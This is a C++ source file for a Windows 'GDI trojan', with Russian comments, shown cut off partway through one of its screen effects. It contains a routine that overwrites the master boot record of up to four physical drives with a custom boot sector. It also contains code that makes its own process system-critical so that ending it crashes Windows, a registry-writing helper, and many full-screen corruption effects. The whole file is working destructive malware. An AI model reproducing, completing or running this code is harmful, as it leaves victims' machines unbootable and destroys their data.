// gdi_trojan_ultimate.cpp - ИСПРАВЛЕННАЯ ВЕРСИЯ
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include <Windows.h>
#include <tchar.h>
#include <windowsx.h>
#include <math.h>
#include <time.h>
#include <stdio.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "advapi32.lib")

#define M_PI 3.14159265358979323846264338327950288

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed, g = rgb.rgbGreen, b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f, _g = (FLOAT)g / 255.f, _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR, deltaG, deltaB;
        FLOAT h = 0.f, s = 0.f, l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l, g = hsl.l, b = hsl.l;
        FLOAT h = hsl.h, sl = hsl.s, l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m, sv, fract, vsf, mid1, mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
                case 0: r = v; g = mid1; b = m; break;
                case 1: r = mid2; g = v; b = m; break;
                case 2: r = m; g = v; b = mid1; break;
                case 3: r = m; g = mid2; b = v; break;
                case 4: r = mid1; g = m; b = v; break;
                case 5: r = v; g = m; b = mid2; break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int stage = 0, r = 0, g = 0, b = 0;

COLORREF Hue(int shift) {
    switch (stage) {
        case 0: r = 255; b = 0; g < 255 ? g += shift : stage++; break;
        case 1: g = 255; b = 0; r > 0 ? r -= shift : stage++; break;
        case 2: g = 255; r = 0; b < 255 ? b += shift : stage++; break;
        case 3: b = 255; r = 0; g > 0 ? g -= shift : stage++; break;
        case 4: b = 255; g = 0; r < 255 ? r += shift : stage++; break;
        case 5: r = 255; g = 0; b > 0 ? b -= shift : stage = 0; break;
    }
    return RGB(r, g, b);
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    // ============================================================
    // СЮДА ВСТАВЬ СВОИ 512 БАЙТ ИЗ mbr.bin
    // ============================================================
    BYTE customMBR[512] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xBB, 
0x34, 0x12, 0x89, 0xD8, 0x35, 0xBF, 0x8E, 0x05, 0x5B, 0x63, 0xC1, 0xC0, 0x03, 0x31, 0xC8, 0x89, 
0xC3, 0x26, 0x88, 0x05, 0x47, 0xE2, 0xEB, 0xBB, 0x00, 0x00, 0xBE, 0x00, 0x00, 0x89, 0xF0, 0xD1, 
0xE8, 0xBA, 0x00, 0x00, 0xB9, 0x0A, 0x00, 0xF7, 0xF1, 0x89, 0xC5, 0xB9, 0x00, 0x00, 0x89, 0xC8, 
0xD1, 0xE0, 0x01, 0xF0, 0x25, 0x1F, 0x00, 0x89, 0xC2, 0xB8, 0x14, 0x00, 0xF7, 0xE2, 0xC1, 0xE8, 
0x05, 0x01, 0xE8, 0x89, 0xC2, 0x81, 0xFA, 0xC8, 0x00, 0x7D, 0x1A, 0x81, 0xFA, 0x00, 0x00, 0x7C, 
0x14, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x01, 0xC8, 0x89, 0xC7, 0xB0, 0x0F, 0x00, 0xC8, 
0x30, 0xD0, 0x26, 0x88, 0x05, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x7C, 0xC2, 0x46, 0x81, 0xFE, 0xC8, 
0x00, 0x7C, 0xAA, 0xBB, 0x00, 0x00, 0x89, 0xD8, 0x35, 0xAD, 0xDE, 0x25, 0x0F, 0x00, 0x05, 0x04, 
0x00, 0x89, 0xC6, 0x89, 0xD8, 0x35, 0xFE, 0xCA, 0x25, 0xFF, 0x01, 0x3D, 0x40, 0x01, 0x7D, 0x3B, 
0x89, 0xC7, 0x89, 0xD8, 0x35, 0xEF, 0xBE, 0x25, 0xFF, 0x00, 0x3D, 0xC8, 0x00, 0x7D, 0x2C, 0x89, 
0xC5, 0x53, 0x56, 0x51, 0x52, 0x89, 0xF9, 0x89, 0xEA, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 
0x01, 0xC8, 0x89, 0xC7, 0x88, 0xD8, 0x00, 0xC8, 0x30, 0xD0, 0x26, 0x88, 0x05, 0x5A, 0x59, 0x41, 
0x39, 0xF1, 0x7C, 0xDF, 0x42, 0x39, 0xF2, 0x7C, 0xDA, 0x5E, 0x5B, 0x43, 0x81, 0xFB, 0x64, 0x00, 
0x7C, 0xA4, 0xB9, 0x00, 0xFA, 0xBF, 0x00, 0x00, 0x26, 0x8A, 0x05, 0x34, 0xFF, 0x26, 0x88, 0x05, 
0x47, 0xE2, 0xF5, 0xE9, 0x1C, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
    // ============================================================
    
    DWORD dwBytesWritten;
    for (int i = 0; i < 4; i++) {
        char path[32];
        sprintf(path, "\\\\.\\PhysicalDrive%d", i);
        HANDLE hDevice = CreateFileA(path, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (hDevice != INVALID_HANDLE_VALUE) {
            WriteFile(hDevice, customMBR, 512, &dwBytesWritten, 0);
            CloseHandle(hDevice);
        }
    }
    return 1;
}

BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, lpszPriv, &luid)) { CloseHandle(hToken); return FALSE; }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HMODULE hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL) {
        EnablePriv("SeDebugPrivilege");
        typedef VOID(_stdcall* RtlSetProcessIsCritical)(IN BOOLEAN, OUT PBOOLEAN, IN BOOLEAN);
        RtlSetProcessIsCritical fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(hDLL, "RtlSetProcessIsCritical");
        if (fSetCritical) { fSetCritical(1, 0, 0); return 1; }
    }
    return 0;
}

void reg_add(HKEY HKey, LPCSTR Subkey, LPCSTR ValueName, unsigned long Type, unsigned int Value) {
    HKEY hKey;
    DWORD dwDisposition;
    RegCreateKeyExA(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
}

// ==================== ВСЕ ЭФФЕКТЫ ====================

DWORD WINAPI rgbhell2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    int phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int idx = y * w + x;
                int val = (x ^ y + phase) % 255;
                rgbquad[idx].rgbRed = (rgbquad[idx].rgbRed + val) % 255;
                rgbquad[idx].rgbGreen = (rgbquad[idx].rgbGreen + (val * 2) % 255) % 255;
                rgbquad[idx].rgbBlue = (rgbquad[idx].rgbBlue + (val * 3) % 255) % 255;
            }
        }
        phase += 3;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI screenrip(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int ripY = rand() % h;
        int ripH = 5 + rand() % 30;
        int offset = rand() % 100 - 50;
        BitBlt(hdc, offset, ripY, w, ripH, mdc, 0, ripY, SRCCOPY);
        BitBlt(hdc, -offset/2, ripY + ripH, w, ripH/2, mdc, 0, ripY, NOTSRCCOPY);
        BitBlt(hdc, offset/3, ripY - ripH/2, w/2, ripH/2, mdc, w/2, ripY, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(20 + rand() % 30);
    }
}

DWORD WINAPI animnoise(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int val = (rand() % 256) ^ (phase + x + y);
                int r = (val + phase) % 255;
                int g = (val + phase * 2) % 255;
                int b = (val + phase * 3) % 255;
                SetPixel(hdc, x, y, RGB(r, g, b));
                SetPixel(hdc, x+1, y, RGB(g, b, r));
            }
        }
        phase += 2;
        ReleaseDC(NULL, hdc);
        Sleep(50 + rand() % 30);
    }
}

DWORD WINAPI mirrorchaos(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int midX = w / 2 + (rand() % 100 - 50);
        int midY = h / 2 + (rand() % 100 - 50);
        BitBlt(hdc, 0, 0, midX, h, mdc, w - midX, 0, SRCCOPY);
        BitBlt(hdc, midX, 0, midX, h, mdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, midY, mdc, 0, h - midY, SRCCOPY);
        BitBlt(hdc, 0, midY, w, midY, mdc, 0, 0, SRCCOPY);
        BitBlt(hdc, rand() % w/2, rand() % h/2, w/3, h/3, mdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(30 + rand() % 30);
    }
}

DWORD WINAPI pixelburst(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int cx = rand() % w;
        int cy = rand() % h;
        int radius = 30 + rand() % 100;
        for (int y = 0; y < h; y += 3) {
            for (int x = 0; x < w; x += 3) {
                int dx = x - cx, dy = y - cy;
                int dist = (int)sqrt(dx*dx + dy*dy);
                if (dist < radius) {
                    int offset = (int)((radius - dist) * 0.6);
                    int nx = x + (dx * offset / (dist + 1));
                    int ny = y + (dy * offset / (dist + 1));
                    BitBlt(hdc, nx, ny, 3, 3, mdc, x, y, SRCCOPY);
                    if (rand() % 3 == 0) {
                        BitBlt(hdc, nx + rand() % 20 - 10, ny + rand() % 20 - 10, 2, 2, mdc, x, y, NOTSRCCOPY);
                    }
                }
            }
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(50 + rand() % 50);
    }
}

DWORD WINAPI shiftxor(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int sx = rand() % 40 - 20;
        int sy = rand() % 40 - 20;
        BitBlt(hdc, sx, sy, w, h, mdc, 0, 0, SRCCOPY);
        BitBlt(hdc, -sx/2, -sy/2, w, h, mdc, 0, 0, SRCINVERT);
        BitBlt(hdc, sx/3, sy/3, w, h, mdc, 0, 0, SRCPAINT);
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCAND);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(20 + rand() % 30);
    }
}

// ==================== СТАРЫЕ ЭФФЕКТЫ ====================

DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(rgbquad[index].rgbBlue + rgbquad[index].rgbGreen + rgbquad[index].rgbRed));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * sin(rgbquad[index].rgbBlue + rgbquad[index].rgbGreen + rgbquad[index].rgbRed));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader3(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)(x ^ (y + (i * 4)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)(x & (x * (i * 4)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
    HDC desk = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            rgbtriple[i].rgbtRed = rand();
            rgbtriple[i].rgbtGreen = rand();
            rgbtriple[i].rgbtBlue = rand();
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
    }
}

DWORD WINAPI sines(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 360;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, NOTSRCCOPY);
            angle += M_PI / 3;
        }
        ReleaseDC(wnd, hdc);
    }
}

DWORD WINAPI SrcinvertCombo(LPVOID lpThread) {
    HDC hdc = GetDC(NULL);
    const int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    const int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    while (TRUE) {
        hdc = GetDC(NULL);
        BitBlt(hdc, rand() % 20, rand() % 20, screenWidth, screenHeight, hdc, rand() % 20, rand() % 20, SRCPAINT);
        BitBlt(hdc, rand() % 20, rand() % 20, screenWidth, screenHeight, hdc, rand() % 20, rand() % 20, SRCINVERT);
        BitBlt(hdc, 3, 7, screenWidth, screenHeight, hdc, 5, 3, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI textout1(LPVOID lpvd) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        SetBkColor(hdc, Hue(3));
        HFONT font = CreateFontA(43, 32, rand() % 360, rand() % 360, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
        SelectObject(hdc, font);
        for (int i = 0; i < 10; i++) {
            char buf[32];
            sprintf(buf, "%d", rand());
            TextOutA(hdc, rand() % x, rand() % y, buf, strlen(buf));
        }
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(50);
    }
}

DWORD WINAPI blur1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (1) {
        hdc = GetDC(0);
        BitBlt(dcCopy, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(dcCopy, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI blur2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
